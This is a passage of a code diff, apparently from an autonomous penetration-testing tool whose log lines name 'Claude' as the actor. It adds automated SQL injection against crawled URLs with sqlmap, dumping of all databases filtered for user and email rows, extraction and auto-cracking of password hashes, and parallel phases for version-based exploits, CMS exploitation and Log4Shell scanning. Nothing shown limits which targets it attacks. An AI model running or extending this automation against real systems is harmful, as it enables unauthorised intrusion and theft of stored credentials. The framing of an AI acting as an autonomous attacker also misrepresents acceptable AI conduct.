+                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
+                f"grep -oP '(?:action|href)=\"[^\"]*\\?[^\"]+\"' | "
+                f"grep -oP '\"[^\"]*\\?[^\"]+\"' | tr -d '\"' | "
+                f"sed 's|^|{base}|g' | head -10; "
+                # Also check common injectable params
+                f"echo '{base}/?id=1'; echo '{base}/?search=test'; echo '{base}/?page=1'",
+                target, timeout=15,
+            )
+            urls_to_test = list(dict.fromkeys(
+                re.findall(r'https?://[^\s"<>]+\?[^\s"<>]+', crawl_out)
+            ))[:5]
+            if not urls_to_test:
+                urls_to_test = [f"{base}/?id=1", f"{base}/?page=1"]
+
+            for test_url in urls_to_test[:3]:
+                self._log(f"[Claude] SQLMAP: probando → {test_url[:60]}")
+                sql_out, _ = self._run_cmd(
+                    f"sqlmap-{port_num}-{hash(test_url) % 9999}",
+                    f"sqlmap -u '{test_url}' --batch --level=2 --risk=2 "
+                    f"--timeout=10 --retries=1 --threads=3 "
+                    f"--technique=BEUSTQ "
+                    f"--output-dir=/tmp/sqlmap_{t_safe}_{port_num}/ "
+                    f"--forms --crawl=2 "
+                    f"2>/dev/null | grep -E 'injectable|payload:|parameter|database|dump|DBMS' | head -30",
+                    target, timeout=180,
+                )
+                if "injectable" in sql_out.lower() or "payload:" in sql_out.lower():
+                    self._log(f"[Claude] SQLMAP: SQLi encontrada → volcando DB!")
+                    dump_out, _ = self._run_cmd(
+                        f"sqlmap-dump-{port_num}",
+                        f"sqlmap -u '{test_url}' --batch --level=2 --risk=2 "
+                        f"--timeout=10 --threads=3 "
+                        f"--output-dir=/tmp/sqlmap_{t_safe}_{port_num}/ "
+                        f"--dbs --dump-all --exclude-sysdbs "
+                        f"--where 'username IS NOT NULL OR user IS NOT NULL OR email IS NOT NULL' "
+                        f"--stop-on-first 2>/dev/null | "
+                        f"grep -E 'available databases|Table:|Column:|Entry:|password|passwd|hash' | head -40",
+                        target, timeout=240,
+                    )
+                    accumulated_output.append(f"=== SQLmap {test_url} ===\n{sql_out[:600]}\n{dump_out[:600]}")
+                    self._auto_crack_hashes(dump_out, target, accumulated_output)
+                    self._save_findings([{
+                        "title": f"SQL Injection + DB Dump @ {test_url[:60]}",
+                        "severity": "critical",
+                        "description": f"SQLmap confirmó inyección SQL:\n{sql_out[:300]}\n\nDump:\n{dump_out[:300]}",
+                        "cve": "",
+                    }], target)
+                elif sql_out.strip():
+                    accumulated_output.append(f"=== SQLmap {test_url[:50]} ===\n{sql_out[:400]}")
+
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
         context_parts = [
@@ -8249,17 +8869,43 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             context_parts.append(f"Servicios: {port_summary}")
             self._log(f"[Claude] {len(open_ports)} servicios: {port_summary[:140]}")
             self._update_attack_path(target, open_ports)
+            self._last_open_ports = open_ports  # used by _windows_post_exploit for AD detection
         else:
             self._log(f"[Claude] Sin puertos abiertos — abortando target {target}")
             return
 
-        # ── FASE 3: Exploits directos por versión (sin IA) ───────────────
-        self._log(f"[Claude] Fase 3/5: Auto-exploits por versión detectada")
-        self._auto_exploit_by_version(target, open_ports, accumulated_output)
+        # ── FASES 3+4+4w: Paralelas — exploits + enum + web ─────────────
+        # Phase 3 (version exploits) and Phase 4 (KB enum) run concurrently
+        # Web phases (fuzz, CMS, Log4Shell, SQLmap) run in a third thread
+        import concurrent.futures as _cf
 
-        # ── FASE 4: Enumeración específica por servicio ───────────────────
-        self._log(f"[Claude] Fase 4/5: Enumeración específica por servicio")
-        self._run_kb_phase(target, open_ports, accumulated_output)
+        def _phase3():
+            self._log(f"[Claude] Fase 3 [parallel]: Auto-exploits por versión")
+            self._auto_exploit_by_version(target, open_ports, accumulated_output)
+
+        def _phase4():
+            self._log(f"[Claude] Fase 4 [parallel]: Enumeración específica por servicio")
+            self._run_kb_phase(target, open_ports, accumulated_output)
+
+        def _phase4w():
+            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap")
+            self._web_fuzz(target, open_ports, accumulated_output)
+            self._cms_exploit(target, open_ports, accumulated_output)
+            self._log4shell_scan(target, open_ports, accumulated_output)
+            self._sqlmap_auto(target, open_ports, accumulated_output)
+
+        self._log(f"[Claude] Iniciando Fases 3+4+4w en paralelo (3 threads)")
+        with _cf.ThreadPoolExecutor(max_workers=3, thread_name_prefix="pentest") as executor:
+            f3 = executor.submit(_phase3)
+            f4 = executor.submit(_phase4)
+            f4w = executor.submit(_phase4w)
+            # Wait for all, surface any exceptions
+            for fut in _cf.as_completed([f3, f4, f4w]):
+                try:
+                    fut.result()
+                except Exception as exc:
+                    self._log(f"[Claude] Fase paralela excepción: {exc}")
+        self._log(f"[Claude] Fases 3+4+4w completadas")
 
         # ── FASE 4b: Credential chaining con todo lo encontrado ─────────
         all_creds_so_far = re.findall(
